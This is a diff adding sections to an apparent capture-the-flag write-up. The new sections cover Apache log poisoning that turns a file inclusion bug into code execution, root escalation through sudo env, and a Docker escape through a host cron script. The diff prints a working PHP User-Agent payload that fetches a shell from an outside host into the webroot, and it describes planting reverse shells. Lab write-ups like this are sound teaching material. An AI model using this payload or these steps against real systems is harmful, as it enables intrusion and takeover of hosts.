@@ -94,6 +94,8 @@
 
 ![image](https://github.com/user-attachments/assets/05a325c9-132b-441d-b130-9cdbd5bc0d3a)
 
+----------------------------
+
 ### LFI Bypass
 
 - Checking through the source page, I discovered this `?view=` parameter that takes in the value `dog`. A lot can go wrong here e.g LFI,sqli e.tc. I decided
@@ -141,9 +143,77 @@ We can bypass the extension check by setting an empty `ext` query.I tested this 
 ![image](https://github.com/user-attachments/assets/d3b9719e-2013-45e7-9044-a73cebb922f3)
 
 
+-------------------------
+
 ### LFI2RCE via log poisoning
 
 -  I was able to reed apache log `/var/log/apache2/access.log`
+
+![image](https://github.com/user-attachments/assets/b9b7d0cb-92a4-4bb6-b02b-63638277f0db)
+
+- We can escalate this poisoning the `User-Agent` header of any request. You can use the php shell code to upload your php shell code hosted on a server.Use curl to make it easier,I suggest you upload a pentestmonkey php reverse shell.
+
+Code-:```"User-Agent: <?php file_put_contents('/var/www/html/shell.php',file_get_contents('http://10.8.158.229:8000/shell2.php')) ?>```
+
+![image](https://github.com/user-attachments/assets/f9c6e579-5f00-4faf-b030-74beb655b1b1)
+
+
+- Reverse shell
+
+![image](https://github.com/user-attachments/assets/ca8bf7ea-4cc7-44b2-aa77-935f7781fc87)
+
+--------------------
+
+### Privesc with `env`
+
+- Running `sudo -l` shows the rule that user `www-data` can run binary `env` as root.
+
+![image](https://github.com/user-attachments/assets/bf0a6f99-464a-40a6-a596-ba129e998f86)
+
+- Root shell
+
+![image](https://github.com/user-attachments/assets/86ab149b-3e09-46f0-bda3-2afb13d60d84)
+
+--------------------------
+
+### Host system's root privesc through docker breakout
+
+- The whole environment is a docker container.I ran this [sh file](https://github.com/stealthcopter/deepce) to enumerate for possible vulnerabiliies to escape the container. The script discovered other mounts in the docker container in `/opt/backups`
+
+![image](https://github.com/user-attachments/assets/eb78f880-30db-4f7b-8cf4-da9a3fb5f151)
+
+- The file `backup.sh` contains a bash code which uses tar to create an tar archive of the container and store it in `/backups/backup.tar`. I figured that it might be a root cron job on the host and added a reverse shell to it.
+
+![image](https://github.com/user-attachments/assets/787d752d-8be8-484b-a0ef-a74589e8a1f1)
+
+- My guess was right,I got a reverse shell from the `host` system's user `root`.
+
+![image](https://github.com/user-attachments/assets/886f2260-47b2-4827-95f4-1d30fd21f5c9)
+
+- Rootttt!!!!....
+
+![image](https://github.com/user-attachments/assets/679e3a13-7816-4d8b-909d-a945ff482a7b)
+
+
+----------------------
+
+### THANKS FOR READING!!!
+
+-----------------------
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
 
 
 
